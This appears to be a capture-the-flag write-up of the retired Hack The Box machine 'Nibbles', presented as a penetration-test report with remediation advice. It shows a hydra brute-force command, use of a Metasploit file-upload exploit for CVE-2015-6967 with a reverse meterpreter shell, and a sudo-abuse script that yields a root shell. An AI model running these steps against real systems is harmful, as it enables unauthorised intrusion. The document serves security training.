# HTB Nibbles 

Nibbles is an easy ranked retired Linux box created Jan 13, 2018 that focuses on exploiting a vulnerable CMS platform with an authenticated arbitrary file upload vulnerability. 

## Service Enumeration 

During initial scans, only two services were discovered: 

|Port|Service|Version|Notes|
|-|-|-|-|
|TCP 80|HTTP|Apache httpd 2.4.18||
|TCP 22|SSH|OpenSSH 7.2p2||

Additional versioning information that was provided indicated that this was a Linux device. 

### Nmap Scan Results: 

```

Nmap scan report for 10.129.174.11
Host is up, received user-set (0.16s latency).
Scanned at 2023-02-13 21:00:24 UTC for 69s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## External Enumeration and Initial Access 

### HTTP 

The landing page discovered at / was a simple "Hello world!" statement.

[![](/nibbles/landing.png)](/nibbles/landing.png)

However, reference to "/nibbleblog" was discovered in the page source. 

[![](/nibbles/sauce.png)](/sauce.png)



Searching with searchsploit, a public exploit for nibbleblog was discovered, however, it was a metasploit module, which required authenticated access in order to gain a shell. 

#### FFUF 

FFUF was used to enumerate directories using the ["common.txt" wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) from the SecLists project. 

**FFUF for /**
[![](/nibbles/ffuf.png)](/nibbles/ffuf.png)


This didn't yield much of interest. 

**FFUF for /nibbleblog**
[![](/nibbles/n_ffuf.png)](/nibbles/n_ffuf.png)

This latter fuzzing attempt discovered quite a few directories that were manually explored. 

At /nibbleblog/content/private/users.xml, a possible administrative username "admin" was discovered. 

[![](/nibbles/users.png)](/nibbles/users.png)


#### Hydra attempt at online password crack 

After gaining the username admin, an attempt was made to do an online dictionary attack against /nibbleblog/admin.php 

```

hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.129.174.11 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password."

```

This resulted in failure, and lockout. It seemed to be the case that the login page had some sort of lockout. 

In order to continue, the box was reverted. 

#### Manual password guessing 

From here, manual password guessing was attempted using terms contextual to the site and CTF box. Credential pair admin:nibbles was eventually discovered. 

#### Exploitation and initial access

Metasploit module exploit/multi/http/nibbleblog_file_upload was utilized with php/meterpreter_reverse_tcp to gain an initial shell. 

This gained a shell a user "nibbler". 



### Vulnerability Explanation: CVE-2015-6967

Versions of Nibbleblog under 4.05 suffer from an arbitrary file upload vulnerability in /admin.php?controller=plugins&action=install&plugin=my_image

This allows an authenticated attacker to upload arbitrary files, including executable formats such as PHP, which can then be accessed and executed at /nibbleblog/content/private/plugins/my_image/image.php

### Vulnerability fix 

- Consider upgrading Nibbleblog to version 4.05
- As nibbleblog is no longer maintained, consider migrating to a different CMS platform 
- Consider developing IPS detections to detect and deny POST traffic to /admin.php?controller=plugins&action=install&plugin=my_image that contains php uploads

**Severity: High**

### Proof of Concept:

Full source for the metasploit module used can be found [here](https://www.exploit-db.com/exploits/38489). 

### Proof Files: 

#### User.txt Screenshot

[![](/nibbles/userproof.png)](/nibbles/userproof.png)

#### User.txt Contents 

87cc5b6961982ce517128bacc1ed334a

## Internal enumeration and Privilege Escalation

Upon gaining initial access, sudo -l was executed and yielded the following: 

```
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

This would allow user nibbler to execute /home/nibbler/personal/stuff/monitor.sh as root. Neither this file nor the containing directories under /home/nibbler existed, and with them being subdirectories of the compromised user account's home folder, write permissions were thus granted to our account to create this script arbitrarily. 

As such, the directory /home/nibbler/personal/stuff/ was created, and the following was executed in that directory to create our malicious script: 

```
touch monitor.sh
echo "#! /bin/bash
/bin/bash" >> monitor.sh
```

chmod was then used to grant execution permissions to this file, which granted us a root shell when run: 

```

sudo ./monitor.sh
whoami
root

```

### Vulnerability Explanation: Insecure sudo privileges 

In Linux environments, sudo grants a user account the ability to run applications as root. Many built in applications have methods of "escape" that can be utilized to launch a shell as root. 

In this particular case, because sudo permissions were granted to an account to run a script that the account also has write access to, this effectively grants that account the ability to run arbitrary code as root. 

### Vulnerability Fix: 

- Consider limiting user nibbler's sudo privileges even further
- If sudo permissions are necessary to this user's job role, consider ensuring that neither the script and any of its dependencies are not writable by this user's account. 
- Consider requiring a password for sudo access

### Proof of Concept Code 

monitor.sh: 

```
#! /bin/bash
/bin/bash
```

This launches a shell, and when run with sudo, grants a root shell. 


### Proof Files 

#### Root.txt Screenshot 

[![](/nibbles/root.png)](/nibbles/root.png)

#### Root.txt contents 

fd72eb1abc9d5b4897c4ce7122530146


